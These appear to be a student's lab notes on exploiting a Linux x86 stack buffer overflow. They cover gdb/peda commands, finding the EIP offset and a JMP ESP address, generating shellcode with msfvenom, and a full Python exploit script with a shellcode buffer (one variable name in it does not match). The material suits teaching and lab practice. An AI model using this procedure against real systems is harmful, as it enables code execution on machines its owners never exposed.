Buffer Overflow Common Terms
	Heap				Memory that can be allocated and deallocated
	Stack				A contiguous section of memory used for passing arguments
	Registers			Storage elements as close as possible to the central processing unit (CPU)
	Instruction Pointer (IP)	a.k.a Program Counter (PC), contains the address of next instruction to be executed
	Stack Pointer (SP)		Contains the address of the next available space on the stack
	Base Pointer (BP)		The base of the stack
	Function			Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
	Shellcode			The code that is executed once an exploit successfully takes advantage of a vulnerability



Buffer Overflow Defenses
	Non executable (NX) stack
	Address Space Layout Randomization (ASLR)
	Data Execution Prevention (DEP)
	Stack Canaries
	Position Independent Executable (PIE)



Technical Help
	Utilizing tools such as:
		IDA, GHIDRA
		GDB, MONA, IMMUNITY
		BASH, PYTHON



GDB Uses
	Installation of Peda Plugin
		git clone https://github.com/longld/peda.git ~/peda
		echo "source ~/peda/peda.py" >> ~/.gdbinit
	Common Commands
		disass <FUNCTION>   #   Disassemble portion of the program
		info <...>  #   Supply info for specific stack areas
		x/256c $<REGISTER>  #   Read characters from specific register
		break <address>  #   Establish a break point








check the type of file
	file [filename]
chomd the file
	chmod u+x [filename]
run strings on the file
	strings [filename]
run the file
	./[filename]
run the file with command suubstition
	./func <<< $(echo "sadfdadfsafdsafd")

Unknown length to get an overflow
	write a script to find out how many characters are needed
run gdb debugger to find outo
	gdb [filename]
		info functions
			worried about breaking the main function
		start
			shows how everything works as the program ran
		run
			runs the program
		disass main
			dissassebles main function
		pdisass main
			dissassembles main functino with color coded

		wiremask.eu
			tools
				buffer overflow pattern
				find the EIP pointer inside of gdb
				put the value in the EIP the offset value
    		Changed the script to allow us to manipulate the EIP value and to verify the position
	env - gdb [filename[
		allows us to bring our environmental variable into gdb
		show env
  		Clear the environmental variable 
			unset env COLUMNS
			unset env LINES
   		info proc map	
			gives information about the processes memory map
   			gives location of heap, stack, and the text of executable
		copy location of the start and end of the stack and put into script
  		find /b [start of stack], [end of stack], [JMP value], [ESP value]
    			0xff is the hex for JMP value
       			0xe4 is the hex for ESP value
	run metasploit
 		to run for first time on box
   			msfdb init
      			msfconsole
				use payload/linux/x86/exec
   			set CMD [command variable to use]
      				show options
			generate -b '\x00\' -f python
   				creates byte code

		OR
   			msfvenom -p linux/x86/exec CMD=whoami -b '\x80'	-f python




					####SCRIPT####

 #!/usr/bin/env python  
 offset = "A" * 62
 EIP = "\xfb\x45\xf6\xf7"
 noop = "\x90" * 10
  
   
 #####STACK LOCATIONS#####
 #start of stack 0xf7de1000
 #end of stack 0xffffe000
 
 
 ######MEMORY LOCATIONS######
 #ESP memory locations
     #0xf7de3b59
     #0xf7f588ab
     #0xf7f645fb
 
 #convert ESP locations to little endian
     #0xf7de3b59 -> "\x59\x3b\xde\xf7"
     #0xf7f588ab -> "\xab\x88\xf5\xf7"
     #0xf7f645fb -> "\xfb\x45\xf6\xf7"
 
 #BYTE CODE
 	#msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
 buf =  b""
 buf += b"\xda\xc2\xbd\xe3\x7b\xf8\x03\xd9\x74\x24\xf4\x58"
 buf += b"\x31\xc9\xb1\x0e\x83\xe8\xfc\x31\x68\x15\x03\x68"
 buf += b"\x15\x01\x8e\x92\x08\x9d\xe8\x31\x69\x75\x26\xd5"
 buf += b"\xfc\x62\x50\x36\x8c\x04\xa1\x20\x5d\xb6\xc8\xde"
 buf += b"\x28\xd5\x59\xf7\x38\x19\x5e\x07\x48\x71\x31\x66"
 buf += b"\xdb\xe8\xed\x4e\x05\xca\x84\xe8\x2a\x65\x39\x93"
 buf += b"\xc5\x1e\xc5\x0c\x45\x69\x24\x7f\xe9"
 
 
 print(buffer+EIP+noop+buf)



			####To run the script####
./func <<<$(./lin_buff.py)










FIND THE LENGTH TO BREAK CODE

	USing wiremask.eu and gdb find how many characters are needed to break it 	

	gdb [filename]

		gdb-peda>run
			FIND EIP and put it into offset value in wiremask.eu

		gdb-peda>info proc map

			Find START ADDR BELOW HEAP

			FIND END ADDR FOR STACK

		student> env - gdb [filename]

		(gdb)>find /b [start of stack], [end of stack], 0xff, 0xe4

			GRAB EIP VALUES TO PUT IN SCRIPT	

		student>msfconsole 

			msf6>use payload/linux/x86/exec

			msf6>set CMD [command trying to run]

			msf6>show options

				used to verify command thats going to be run

			msf6>generate -b '\x00\' -f python

				will create the actual "buf" code used in script
			



